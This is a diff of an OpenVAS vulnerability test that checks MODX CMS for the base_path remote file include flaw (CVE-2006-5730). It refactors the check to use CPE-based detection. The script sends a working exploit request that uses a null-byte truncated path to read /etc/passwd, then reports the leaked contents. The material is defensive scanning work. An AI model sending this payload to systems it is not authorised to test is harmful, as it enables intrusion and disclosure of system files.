@@ -1,6 +1,8 @@
+###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: modx_0921_rfi.nasl 4489 2016-11-14 08:23:54Z teissa $
-# Description: MODx CMS base_path Parameter Remote File Include Vulnerability
+# $Id: modx_0921_rfi.nasl 5889 2017-04-07 09:14:58Z cfi $
+#
+# MODX CMS base_path Parameter Remote File Include Vulnerability
 #
 # Authors:
 # Justin Seitz <jms@bughunter.ca>
@@ -20,123 +22,98 @@
 # You should have received a copy of the GNU General Public License
 # along with this program; if not, write to the Free Software
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
-#
-
-tag_summary = "The remote web server contains a PHP script that is affected by a
-remote file include issue. 
-
-Description:
-
-The remote web server is running MODx CMS, an open source content
-management system. 
-
-The version of MODx CMS installed on the remote host fails to sanitize
-input to the 'base_path' parameter before using it in the
-'manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php'
-script to include PHP code.  Provided PHP's 'register_globals' setting
-is enabled, an unauthenticated attacker can exploit this issue to view
-arbitrary files and execute arbitrary code, possibly taken from
-third-party hosts, on the remote host.";
-
-tag_solution = "Update to version 0.9.2.2 or later.";
+###############################################################################
 
 if(description)
 {
- # set script identifiers
+  script_oid("1.3.6.1.4.1.25623.1.0.80072");
+  script_version("$Revision: 5889 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-04-07 11:14:58 +0200 (Fri, 07 Apr 2017) $");
+  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
+  script_tag(name:"cvss_base", value:"5.1");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
+  script_cve_id("CVE-2006-5730");
+  script_bugtraq_id(20898);
+  script_xref(name:"OSVDB", value:"30186");
+  script_name("MODX CMS base_path Parameter Remote File Include Vulnerability");
+  script_category(ACT_ATTACK);
+  script_copyright("This script is Copyright (C) 2006 Justin Seitz");
+  script_family("Web application abuses");
+  script_dependencies("gb_modx_cms_detect.nasl");
+  script_require_ports("Services/www", 80);
+  script_mandatory_keys("modx_cms/installed");
 
- script_id(80072);;
- script_version("$Revision: 4489 $");
- script_tag(name:"last_modification", value:"$Date: 2016-11-14 09:23:54 +0100 (Mon, 14 Nov 2016) $");
- script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
- script_tag(name:"cvss_base", value:"5.1");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
+  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/2706");
+  script_xref(name:"URL", value:"http://modxcms.com/forums/index.php/topic,8604.0.html");
 
- script_cve_id("CVE-2006-5730");
- script_bugtraq_id(20898);
- script_xref(name:"OSVDB", value:"30186");
+  tag_summary = "The remote web server is running MODX CMS, an open source content
+  management system which is affected by a remote file include issue.";
 
- name = "MODx CMS base_path Parameter Remote File Include Vulnerability";
- summary = "Tries to read a local file with MODx CMS";
- family = "Web application abuses";
+  tag_insight = "The version of MODX CMS installed on the remote host fails to sanitize
+  input to the 'base_path' parameter before using it in the
+  'manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php'
+  script to include PHP code.";
 
- script_name(name);
+  tag_impact = "Provided PHP's 'register_globals' setting is enabled, an unauthenticated
+  attacker can exploit this issue to view arbitrary files and execute arbitrary code,
+  possibly taken from third-party hosts, on the remote host.";
 
- script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
- script_copyright("This script is Copyright (C) 2006 Justin Seitz");
+  tag_solution = "Update to version 0.9.2.2 or later.";
 
- script_family(family);
+  script_tag(name:"summary", value:tag_summary);
+  script_tag(name:"insight", value:tag_insight);
+  script_tag(name:"impact", value:tag_impact);
+  script_tag(name:"solution", value:tag_solution);
 
- script_dependencies("http_version.nasl");
- script_require_ports("Services/www", 80);
- script_exclude_keys("Settings/disable_cgi_scanning");
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/2706");
- script_xref(name : "URL" , value : "http://modxcms.com/forums/index.php/topic,8604.0.html");
- exit(0);
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"qod_type", value:"remote_app");
+
+  exit(0);
 }
 
-
-include("global_settings.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
 
-port = get_http_port(default:80);
+cpe_list = make_list( "cpe:/a:modx:unknown",
+                      "cpe:/a:modx:revolution",
+                      "cpe:/a:modx:evolution" );
 
-#
-# verify we can talk to the web server, if not exit
-#
+if( ! infos = get_all_app_port_from_list( cpe_list:cpe_list ) ) exit( 0 );
+cpe = infos['cpe'];
+port = infos['port'];
 
-if(!get_port_state(port)) exit(0);
-if(!can_host_php(port:port)) exit(0);
-
-#
-# create list of directories to scan
-#
-
-
-# Loop through directories.
-dirs = make_list("/modx", "/cms", cgi_dirs());
-
-#
-# Iterate through the list
-#
+if( ! dir = get_app_location( cpe:cpe, port:port ) ) exit( 0 );
 
 file = "/etc/passwd";
 
-foreach dir (dirs) {
+if( dir == "/" ) dir = "";
+url = string(dir, "/manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php?base_path=", file, "%00");
+req = http_get( item:url, port:port );
+res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
+if( isnull( res ) ) exit( 0 );
 
-#
-#
-#       Attack: Attempt a remote file include of /etc/passwd
-#
-#
-  attackreq = http_get(item:string(dir, "/manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php?base_path=", file, "%00"),port:port);
-  attackres = http_keepalive_send_recv(port:port, data:attackreq, bodyonly:TRUE);
-  if (attackres == NULL) exit(0);
+if( egrep( pattern:"root:.*:0:[01]:", string:res ) ||
+    string( "main(", file, "\\0manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php): failed to open stream" ) >< res ||
+    string( "main(", file, "): failed to open stream: No such file" ) >< res ||
+    "open_basedir restriction in effect. File(" >< res )	{
 
-  if (dir == "") dir = "/";
-
-  if (egrep(pattern:"root:.*:0:[01]:", string:attackres) ||
-    string("main(", file, "\\0manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php): failed to open stream") >< attackres ||
-    string("main(", file, "): failed to open stream: No such file") >< attackres ||
-    "open_basedir restriction in effect. File(" >< attackres)	{
-
-    passwd = "";
-    if (egrep(pattern:"root:.*:0:[01]:", string:attackres))	{
-      passwd = attackres;
-      if ("<br" >< passwd) passwd = passwd - strstr(passwd, "<br");
-    }
-
-    if (passwd) {
-      info = string("The version of MODx CMS installed in directory '", dir, "'\n",
-        "is vulnerable to this issue. Here is the contents of /etc/passwd\n",
-        "from the remote host :\n\n", passwd);
-    }
-    else info = "";
-
-    security_message(data:info, port:port);
-    exit(0);
+  passwd = NULL;
+  if( egrep( pattern:"root:.*:0:[01]:", string:res ) ) {
+    passwd = res;
+    if( "<br" >< passwd ) passwd = passwd - strstr(passwd, "<br");
   }
+
+  if( passwd ) {
+    info = string( "The version of MODX CMS installed in directory '", dir, "'\n",
+                   "is vulnerable to this issue. Here is the contents of /etc/passwd\n",
+                   "from the remote host :\n\n", passwd );
+  } else {
+    info = "";
+  }
+
+  security_message( data:info, port:port );
+  exit( 0 );
 }
+
+exit( 99 );
